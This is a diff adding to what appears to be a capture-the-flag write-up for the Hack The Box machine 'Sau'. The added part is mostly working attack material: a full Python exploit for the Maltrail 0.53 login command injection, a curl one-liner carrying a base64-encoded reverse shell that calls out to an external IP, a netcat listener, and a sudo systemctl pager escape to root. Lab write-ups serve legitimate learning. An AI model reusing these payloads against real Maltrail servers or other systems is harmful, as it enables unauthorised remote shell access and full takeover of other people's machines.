@@ -75,3 +75,62 @@ Then open Configuration Settings and wrote in Forward URL: ```http://127.0.0.1:8
 
 ![obraz](https://github.com/Anogota/Sau/assets/143951834/175e0cc7-2b8f-4e38-a214-7f5104262b08)
 
+And we got access into port 80, this is powered by by Maltrail (v0.53) let's also search something about this vuln. 
+I found the code, this help us the get a reverse-shell first what we need to do is turn on the ```nc -lvnp 9001```
+```
+#!/bin/python3
+
+import sys
+import os
+import base64
+
+# Arguments to be passed
+YOUR_IP = sys.argv[1]  # <your ip>
+YOUR_PORT = sys.argv[2]  # <your port>
+TARGET_URL = sys.argv[3]  # <target url>
+
+print("\n[+]Started MailTrail version 0.53 Exploit")
+
+# Fail-safe for arguments
+if len(sys.argv) != 4:
+    print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
+    sys.exit(-1)
+
+
+# Exploit the vulnerbility
+def exploit(my_ip, my_port, target_url):
+    # Defining python3 reverse shell payload
+    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+    # Encoding the payload with base64 encoding
+    encoded_payload = base64.b64encode(payload.encode()).decode()
+    # curl command that is to be executed on our system to exploit mailtrail
+    command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
+    # Executing it
+    os.system(command)
+
+
+print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
+try:
+    exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
+    print("\n[+] Successfully Exploited")
+    print("\n[+] Check your Reverse Shell Listener")
+except:
+    print("\n[!] An Error has occured. Try again!")
+```
+Wrote in your terminal ```python3 exploit.py 10.10.16.6 9001 http://10.10.11.224:55555/htb1```
+And you got a access, but in lab is secend way to get a reverse-shell
+```curl 'http://34.124.197.100:8338/login' \  --data 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjU0LjIxMS42NC45NiIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn|base64 -d|bash`'```
+In this base64 is encode python reverse-shell
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+```
+Change your IP and PORT and encode this in Base64 also rember to turn on the netcat.
+By this curl you can get a reverse shell. Now when you have a user, let's try to get a root, first what you need to do is sudo -l 
+```
+/usr/bin/systemctl status.trial.service
+```
+I google it and this what i found.
+First you need to insert in reverse-shell 
+``` sudo /usr/bin/systemctl status.trial.service ```
+Then write !sh and you got the root.
+Thank You!
